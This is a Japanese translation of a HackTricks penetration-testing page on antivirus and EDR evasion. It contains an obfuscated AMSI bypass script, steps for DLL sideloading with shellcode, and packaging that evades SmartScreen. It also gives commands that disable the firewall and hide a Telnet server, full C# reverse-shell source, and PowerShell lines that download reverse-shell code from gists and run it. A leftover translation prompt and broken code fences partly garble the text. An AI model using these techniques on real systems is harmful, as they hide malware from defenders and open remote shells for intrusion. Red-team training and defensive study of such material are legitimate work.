# アンチウイルス (AV) バイパス

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ会社**で働いていますか？**HackTricksで会社の広告を掲載**したいですか？または、**最新のPEASSバージョンにアクセス**したり、**HackTricksをPDFでダウンロード**したいですか？[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをご覧ください。
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手してください。
* **[**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**にフォローしてください。**
* **[**hacktricksリポジトリ**](https://github.com/carlospolop/hacktricks)にPRを提出して、ハッキングのコツを共有してください。**そして** [**hacktricks-cloudリポジトリ**](https://github.com/carlospolop/hacktricks-cloud)も。

</details>

**このページは** [**@m2rc\_p**](https://twitter.com/m2rc\_p)**によって書かれました！**

## **AV回避方法論**

現在、AVはファイルが悪意のあるものかどうかをチェックするために、静的検出、動的分析、そしてより進んだEDRの場合は行動分析など、異なる方法を使用しています。

### **静的検出**

静的検出は、バイナリやスクリプト内の既知の悪意のある文字列やバイト配列をフラグ付けすること、およびファイル自体から情報を抽出すること（例：ファイルの説明、会社名、デジタル署名、アイコン、チェックサムなど）によって達成されます。これは、公開されている既知のツールを使用すると、それらがおそらく分析されて悪意のあるものとしてフラグ付けされているため、より簡単に捕まる可能性があることを意味します。この種の検出を回避する方法はいくつかあります：

* **暗号化**

バイナリを暗号化すると、AVはプログラムを検出する方法がなくなりますが、メモリ内でプログラムを復号化して実行するための何らかのローダーが必要になります。

* **難読化**

AVを回避するためには、バイナリやスクリプトの一部の文字列を変更するだけで済むことがありますが、何を難読化しようとしているかによっては、時間がかかる作業になることがあります。

* **カスタムツール**

独自のツールを開発すれば、既知の悪い署名は存在しないのですが、これには多くの時間と労力がかかります。

{% hint style="info" %}
Windows Defenderの静的検出に対してチェックする良い方法は[ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)です。基本的にはファイルを複数のセグメントに分割し、それぞれをDefenderにスキャンさせることで、バイナリ内のどの文字列やバイトがフラグ付けされているかを正確に教えてくれます。
{% endhint %}

実用的なAV回避についてのこの[YouTubeプレイリスト](https://www.youtube.com/playlist?list=PLj05gPj8rk\_pkb12mDe4PgYZ5qPxhGKGf)をチェックすることを強くお勧めします。

### **動的分析**

動的分析は、AVがバイナリをサンドボックスで実行し、悪意のある活動を監視するときに行われます（例：ブラウザのパスワードを復号化して読み取ろうとする、LSASSに対してミニダンプを実行するなど）。この部分は少し扱いにくいかもしれませんが、サンドボックスを回避するためにできることがいくつかあります。

* **実行前のスリープ** どのように実装されているかによって、AVの動的分析を回避する素晴らしい方法になることがあります。AVはユーザーのワークフローを中断しないようにファイルをスキャンする時間が非常に短いため、長いスリープを使用するとバイナリの分析が乱れる可能性があります。問題は、多くのAVのサンドボックスが、実装方法によってはスリープをスキップできることです。
* **マシンのリソースのチェック** 通常、サンドボックスは非常に少ないリソース（例：< 2GB RAM）で動作します。そうでなければ、ユーザーのマシンを遅くする可能性があります。ここで非常に創造的になることもできます。たとえば、CPUの温度やファンの速度をチェックするなど、サンドボックスにはすべてが実装されているわけではありません。
* **マシン固有のチェック** "contoso.local"ドメインに参加しているユーザーをターゲットにしたい場合は、コンピューターのドメインをチェックして、指定したものと一致するかどうかを確認できます。一致しない場合は、プログラムを終了させることができます。

Microsoft Defenderのサンドボックスコンピューター名はHAL9THであることがわかったので、マルウェア内でコンピューター名をチェックすることができます。名前がHAL9THと一致する場合は、Defenderのサンドボックス内にいることを意味するので、プログラムを終了させることができます。

<figure><img src="../.gitbook/assets/image (3) (6).png" alt=""><figcaption><p>出典: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

サンドボックスに対抗するための[@mgeeky](https://twitter.com/mariuszbit)からの他の非常に良いヒント

<figure><img src="../.gitbook/assets/image (2) (1) (1) (2) (1).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev チャンネル</p></figcaption></figure>

この投稿で以前に言ったように、**公開ツール**は最終的に**検出される**ので、自分自身に次のようなことを尋ねるべきです：

たとえば、LSASSをダンプしたい場合、本当に**mimikatzを使用する必要がありますか**？それとも、LSASSをダンプする別の、あまり知られていないプロジェクトを使用できますか。

正しい答えはおそらく後者です。例としてmimikatzを取り上げると、それはおそらくAVとEDRによって最もフラグ付けされているマルウェアの1つ、もしくは最もフラグ付けされているものですが、プロジェクト自体は非常にクールですが、AVを回避するためにそれを使用するのは悪夢です。ですので、達成しようとしていることの代替案を探してください。

{% hint style="info" %}
回避のためにペイロードを変更するときは、Defenderで**自動サンプル提出をオフにする**ことを確認し、そしてお願いですが、本気で長期的な回避を目指している場合は、**VIRUSTOTALにアップロードしないでください**。特定のAVでペイロードが検出されるかどうかを確認したい場合は、VMにインストールし、自動サンプル提出をオフにし、結果に満足するまでテストしてください。
{% endhint %}

## EXEとDLL

可能な限り、常に**回避のためにDLLの使用を優先**してください。私の経験では、DLLファイルは通常、**はるかに検出されにくい**し、分析されることも少ないので、いくつかのケースで検出を避けるための非常にシンプルなトリックです（もちろん、ペイロードがDLLとして実行される方法がある場合）。

この画像でわかるように、HavocのDLLペイロードはantiscan.meで4/26の検出率を持っていますが、EXEペイロードは7/26の検出率を持っています。

<figure><img src="../.gitbook/assets/image (6) (3) (1).png" alt=""><figcaption><p>antiscan.meでの通常のHavoc EXEペイロードと通常のHavoc DLLの比較</p></figcaption></figure>

これから、DLLファイルを使用してもっと隠密に行動するためのいくつかのコツを紹介します。

## DLLサイドローディング & プロキシング

**DLLサイドローディング**は、ローダーが使用するDLL検索順序を利用して、被害者アプリケーションと悪意のあるペイロードを隣り合わせに配置することで利用します。

[Siofra](https://github.com/Cybereason/siofra)と次のpowershellスクリプトを使用して、DLLサイドローディングに対応しているプログラムをチェックできます：

{% code overflow="wrap" %}
```powershell
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
{% endcode %}

このコマンドは、"C:\Program Files\\" 内のDLLハイジャックの可能性があるプログラムのリストと、それらが試みるDLLファイルをロードするリストを出力します。

私はあなたに**自分自身でDLLハイジャック可能/サイドロード可能なプログラムを探索すること**を強くお勧めします。この技術は適切に行われればかなり隠密ですが、公に知られているDLLサイドロード可能なプログラムを使用すると、簡単に捕まる可能性があります。

プログラムがロードしようとする名前の悪意のあるDLLを配置するだけでは、ペイロードはロードされません。プログラムはそのDLL内に特定の関数を期待しているためです。この問題を解決するために、**DLLプロキシング/フォワーディング**と呼ばれる別の技術を使用します。

**DLLプロキシング**は、プロキシ（および悪意のある）DLLからのプログラムの呼び出しを元のDLLに転送し、プログラムの機能を維持しつつ、ペイロードの実行を処理することができます。

私は[@flangvik](https://twitter.com/Flangvik/)の[SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy)プロジェクトを使用します。

これらは私が従ったステップです：

{% code overflow="wrap" %}
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
{% endcode %}

最後のコマンドにより、DLLソースコードテンプレートと、名前を変更したオリジナルのDLLの2つのファイルが生成されます。

<figure><img src="../.gitbook/assets/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
{% endcode %}

これが結果です：

<figure><img src="../.gitbook/assets/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

私たちのシェルコード（[SGN](https://github.com/EgeBalci/sgn)でエンコードされた）とプロキシDLLは、[antiscan.me](https://antiscan.me)で0/26の検出率です！これは成功と言えるでしょう。

<figure><img src="../.gitbook/assets/image (11) (3).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
DLLサイドローディングについての[S3cur3Th1sSh1tのTwitch VOD](https://www.twitch.tv/videos/1644171543)と、より深く学ぶための[ippsecのビデオ](https://www.youtube.com/watch?v=3eROsG\_WNpE)を見ることを**強くお勧めします**。
{% endhint %}

## [**Freeze**](https://github.com/optiv/Freeze)

`Freezeは、中断されたプロセス、直接システムコール、および代替実行方法を使用してEDRをバイパスするためのペイロードツールキットです`

Freezeを使用して、シェルコードを目立たない方法でロードして実行できます。
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../.gitbook/assets/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
回避は猫とネズミのゲームです。今日効果があるものが明日検出される可能性がありますので、一つのツールにのみ依存しないでください。可能であれば、複数の回避技術を連鎖させて試みてください。
{% endhint %}

## AMSI (アンチマルウェア スキャン インターフェース)

AMSIは「[ファイルレスマルウェア](https://en.wikipedia.org/wiki/Fileless\_malware)」を防ぐために作られました。初期のAVは**ディスク上のファイル**のスキャンのみが可能でしたので、ペイロードを**直接メモリ内で実行**できれば、AVは何も防げませんでした。なぜなら、十分な可視性がなかったからです。

AMSI機能はWindowsのこれらのコンポーネントに統合されています。

* ユーザーアカウント制御、またはUAC（EXE、COM、MSI、またはActiveXインストールの昇格）
* PowerShell（スクリプト、対話型使用、および動的コード評価）
* Windows Script Host（wscript.exeおよびcscript.exe）
* JavaScriptおよびVBScript
* Office VBAマクロ

これにより、アンチウイルスソリューションは、スクリプトの内容を暗号化されておらず、難読化されていない形式で公開することにより、スクリプトの動作を検査できます。

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` を実行すると、Windows Defenderで以下のアラートが表示されます。

<figure><img src="../.gitbook/assets/image (4) (5).png" alt=""><figcaption></figcaption></figure>

スクリプトが実行された実行可能ファイルへのパスの前に `amsi:` が追加されていることに注意してください。この場合はpowershell.exeです。

ディスクにファイルをドロップしていないにもかかわらず、AMSIのためにメモリ内で捕捉されました。

AMSIを回避する方法はいくつかあります：

* **難読化**

AMSIは主に静的検出を行うため、ロードしようとするスクリプトを変更することは、検出を回避するための良い方法です。

しかし、AMSIは複数のレイヤーがあってもスクリプトの難読化を解除する能力があるため、難読化はどのように行われるかによっては悪い選択肢になる可能性があります。そのため、回避はそれほど簡単ではありません。ただし、時には変数名をいくつか変更するだけで十分な場合もあるので、どれだけ何かがフラグされているかによります。

* **AMSIバイパス**

AMSIはpowershell（またはcscript.exe、wscript.exeなど）プロセスにDLLをロードすることによって実装されているため、特権のないユーザーとして実行していても簡単に改ざんすることができます。このAMSIの実装の欠陥により、研究者たちはAMSIスキャンを回避する複数の方法を見つけました。

**エラーを強制する**

AMSIの初期化に失敗させる（amsiInitFailed）と、現在のプロセスに対してスキャンが開始されない結果になります。もともとこれは[Matt Graeber](https://twitter.com/mattifestation)によって公開され、Microsoftはより広範な使用を防ぐためのシグネチャを開発しました。

{% code overflow="wrap" %}
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
{% endcode %}

たった一行のpowershellコードで、現在のpowershellプロセスに対してAMSIを無効にすることができました。この行はもちろんAMSI自体によってフラグが立てられているため、この技術を使用するためにはいくつかの変更が必要です。

こちらは、この[Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db)から取得した変更されたAMSIバイパスです。
```powershell
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
以下は、ハッキング技術に関するハッキングの本の内容です。関連する英語のテキストを日本語に翻訳し、まったく同じマークダウンおよびhtml構文を保持して翻訳を返してください。コード、ハッキング技術名、ハッキング用語、クラウド/SaaSプラットフォーム名（Workspace、aws、gcpなど）、'leak'という単語、ペネトレーションテスト、およびマークダウンタグなどの翻訳は行わないでください。また、翻訳とマークダウン構文以外の余分なものは何も追加しないでください。

**メモリパッチング**

この技術は最初に[@RastaMouse](https://twitter.com/\_RastaMouse/)によって発見され、amsi.dll（ユーザー提供の入力をスキャンする責任がある）の"AmsiScanBuffer"関数のアドレスを見つけ、E_INVALIDARGのコードを返す命令で上書きすることを含んでいます。この方法では、実際のスキャンの結果は0を返し、これはクリーンな結果として解釈されます。

{% hint style="info" %}
より詳細な説明については、[https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/)を読んでください。
{% endhint %}

powershellを使用してAMSIをバイパスするために使用される他の多くの技術もあります。[**このページ**](basic-powershell-for-pentesters/#amsi-bypass)と[このリポジトリ](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)をチェックして、それらについてもっと学んでください。

または、このスクリプトはメモリパッチングを介して新しいPowershをパッチします

## 難読化

以下のツールは、**C# クリアテキストコードを難読化する**、バイナリをコンパイルするための**メタプログラミングテンプレートを生成する**、または**コンパイルされたバイナリを難読化する**ために使用できます：

* [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**：C# 難読化ツール**
* [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): このプロジェクトの目的は、[LLVM](http://www.llvm.org/) コンパイルスイートのオープンソースフォークを提供し、[コード難読化](http://en.wikipedia.org/wiki/Obfuscation\_\(software\))と改ざん防止を通じてソフトウェアのセキュリティを向上させることです。
* [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscatorは、コンパイラを変更することなく、外部ツールを使用せずに、コンパイル時に`C++11/14`言語を使用して難読化されたコードを生成する方法を示しています。
* [**obfy**](https://github.com/fritzone/obfy): C++テンプレートメタプログラミングフレームワークによって生成された難読化された操作の層を追加し、アプリケーションをクラックしようとする人の作業を少し難しくします。
* [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatrazは、.exe、.dll、.sysなど、さまざまなpeファイルを難読化できるx64バイナリ難読化ツールです。
* [**metame**](https://github.com/a0rtega/metame): Metameは任意の実行可能ファイル用のシンプルなメタモルフィックコードエンジンです。
* [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscatorは、ROP（リターン指向プログラミング）を使用して、LLVM対応言語の細かいコード難読化フレームワークです。ROPfuscatorは、通常の命令をROPチェーンに変換することで、プログラムをアセンブリコードレベルで難読化し、通常の制御フローの私たちの自然な概念を妨げます。
* [**Nimcrypt**](https://github.com/icyguider/nimcrypt): NimcryptはNimで書かれた.NET PE Crypterです
* [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptorは既存のEXE/DLLをシェルコードに変換し、それらをロードすることができます

## SmartScreen & MoTW

インターネットからいくつかの実行可能ファイルをダウンロードして実行するときに、この画面を見たことがあるかもしれません。

Microsoft Defender SmartScreenは、エンドユーザーが潜在的に悪意のあるアプリケーションを実行するのを防ぐことを目的としたセキュリティメカニズムです。

<figure><img src="../.gitbook/assets/image (1) (4).png" alt=""><figcaption></figcaption></figure>

SmartScreenは主に評判ベースのアプローチで動作し、一般的でないダウンロードアプリケーションはSmartScreenをトリガーし、エンドユーザーに警告し、ファイルの実行を防ぎます（ただし、[詳細情報 -> とにかく実行]をクリックすることでファイルは実行できます）。

**MoTW**（ウェブのマーク）は、インターネットからダウンロードしたファイルに自動的に作成される[NTFS代替データストリーム](https://en.wikipedia.org/wiki/NTFS#Alternate\_data\_stream\_\(ADS\))で、Zone.Identifierという名前が付けられ、ダウンロード元のURLも一緒に作成されます。

<figure><img src="../.gitbook/assets/image (13) (3).png" alt=""><figcaption><p>インターネットからダウンロードしたファイルのZone.Identifier ADSを確認します。</p></figcaption></figure>

{% hint style="info" %}
**信頼された**署名証明書で署名された実行可能ファイルは**SmartScreenをトリガーしない**ことに注意してください。
{% endhint %}

ペイロードがウェブのマークを取得するのを防ぐ非常に効果的な方法は、ISOのような何らかのコンテナ内にパッケージ化することです。これは、ウェブのマーク（MOTW）が**非NTFS**ボリュームには**適用できない**ためです。

<figure><img src="../.gitbook/assets/image (12) (2) (2).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/)は、ウェブのマークを回避するためにペイロードを出力コンテナにパッケージ化するツールです。

使用例：
```powershell
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
以下は、[PackMyPayload](https://github.com/mgeeky/PackMyPayload/)を使用してISOファイル内にペイロードをパッケージングすることでSmartScreenをバイパスするデモです。

<figure><img src="../.gitbook/assets/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## C# アセンブリリフレクション

メモリ内でC#バイナリをロードする方法は以前から知られており、AVに検出されずにポストエクスプロイトツールを実行するための非常に優れた方法です。

ペイロードがディスクに触れることなく直接メモリにロードされるため、AMSIをパッチすることだけを心配すればよいです。

ほとんどのC2フレームワーク（sliver、Covenant、metasploit、CobaltStrike、Havocなど）は、メモリ内で直接C#アセンブリを実行する機能を提供していますが、実行方法にはいくつかの違いがあります：

* **Fork\&Run**

新しい犠牲プロセスを**生成し**、その新しいプロセスにポストエクスプロイトの悪意のあるコードを注入し、悪意のあるコードを実行し、終了したら新しいプロセスを終了させることを含みます。これには利点と欠点があります。fork and runメソッドの利点は、実行がBeaconインプラントプロセスの**外部**で行われることです。これは、ポストエクスプロイトアクションで何かが間違っていたり、検出されたりした場合、インプラントが**生き残る可能性が**はるかに高いことを意味します。欠点は、**行動検出**によって検出される可能性が**高くなる**ことです。

<figure><img src="../.gitbook/assets/image (7) (1) (3).png" alt=""><figcaption></figcaption></figure>

* **Inline**

ポストエクスプロイトの悪意のあるコードを**自身のプロセスに注入する**ことについてです。この方法では、新しいプロセスを作成し、AVにスキャンされることを避けることができますが、ペイロードの実行に何か問題が発生した場合、**ビーコンを失う可能性が**はるかに高くなります。なぜなら、それによってクラッシュする可能性があるからです。

<figure><img src="../.gitbook/assets/image (9) (3).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
C# アセンブリローディングについてもっと読みたい場合は、この記事 [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) とそのInlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly)) をチェックしてください。
{% endhint %}

また、PowerShellからC#アセンブリをロードすることもできます。[Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) と [S3cur3th1sSh1tのビデオ](https://www.youtube.com/watch?v=oe11Q-3Akuk) をチェックしてください。

## 他のプログラミング言語の使用

[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) で提案されているように、攻撃者が制御するSMB共有にインストールされたインタープリタ環境へのアクセスを侵害されたマシンに与えることで、他の言語を使用して悪意のあるコードを実行することが可能です。

SMB共有上のインタープリタバイナリと環境へのアクセスを許可することで、侵害されたマシンのメモリ内でこれらの言語の任意のコードを**実行することができます**。

リポジトリは次のように示しています：Defenderはスクリプトを引き続きスキャンしますが、Go、Java、PHPなどを利用することで、静的シグネチャをバイパスする**柔軟性が増します**。これらの言語でランダムな未難読化リバースシェルスクリプトをテストした結果、成功しています。

## 高度な回避

回避は非常に複雑なトピックであり、時には一つのシステム内で多くの異なるテレメトリソースを考慮に入れなければならないため、成熟した環境で完全に検出されないことはほぼ不可能です。

対峙するすべての環境には、それぞれの強みと弱みがあります。

より高度な回避技術についての理解を深めるために、[@ATTL4S](https://twitter.com/DaniLJ94) のこのトークを見ることを強くお勧めします。

{% embed url="https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo" %}

これは、回避の深さについての[@mariuszbit](https://twitter.com/mariuszbit) の素晴らしいトークもあります。

{% embed url="https://www.youtube.com/watch?v=IbA7Ung39o4" %}

## **古い技術**

### **Defenderが悪意あると判断する部分をチェックする**

[**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) を使用すると、バイナリの一部を**削除して**、Defenderが悪意あると判断する部分を見つけ出し、分割してくれます。\
同じことを行う別のツールは [**avred**](https://github.com/dobin/avred) で、サービスを提供するオープンウェブが [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) にあります。

### **Telnetサーバー**

Windows10まで、すべてのWindowsには**Telnetサーバー**があり、次のようにして管理者としてインストールすることができました：
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
システムが起動したときに**開始**し、今すぐ**実行**します：
```bash
sc config TlntSVR start= auto obj= localsystem
```
**telnet ポートの変更**（ステルス）とファイアウォールの無効化：
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

以下からダウンロードしてください: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (セットアップではなく、binダウンロードを選びます)

**ホスト側で**: _**winvnc.exe**_ を実行し、サーバーを設定します:

* _Disable TrayIcon_ オプションを有効にする
* _VNC Password_ にパスワードを設定する
* _View-Only Password_ にパスワードを設定する

その後、バイナリ _**winvnc.exe**_ と **新しく** 作成されたファイル _**UltraVNC.ini**_ を **被害者** の中に移動します

#### **リバース接続**

**攻撃者**は自分の **ホスト** 内でバイナリ `vncviewer.exe -listen 5900` を **実行** し、リバース **VNC接続** をキャッチする準備をします。その後、**被害者** 内で: winvncデーモンを `winvnc.exe -run` で起動し、`winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` を実行します

**警告:** ステルスを維持するためにはいくつかのことを行ってはいけません

* 既に実行中の場合は `winvnc` を開始しないでください。そうすると[ポップアップ](https://i.imgur.com/1SROTTl.png)が表示されます。`tasklist | findstr winvnc` で実行中かどうかを確認してください
* 同じディレクトリに `UltraVNC.ini` がない状態で `winvnc` を開始しないでください。そうすると[設定ウィンドウ](https://i.imgur.com/rfMQWcf.png)が開きます
* ヘルプのために `winvnc -h` を実行しないでください。そうすると[ポップアップ](https://i.imgur.com/oc18wcu.png)が表示されます

### GreatSCT

以下からダウンロードしてください: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Inside GreatSCT:
GreatSCTの内部:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
```
msfconsole -r file.rc を使用して **リスナーを起動し**、以下で **xmlペイロードを実行します**:
```
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**現在のディフェンダーはプロセスを非常に迅速に終了させます。**

### 独自のリバースシェルをコンパイルする

https://medium.com/@Bank\_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### 最初のC#リバースシェル

以下のコマンドでコンパイルします：
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
```
それを使用するには：
```
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
```
### C# コンパイラを使用
```
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
自動ダウンロードと実行：
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
```markdown
{% embed url="https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f" %}

C# オブスキュレーターのリスト: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
### その他のツール

[https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)

Merlin, Empire, Puppy, SalsaTools https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/

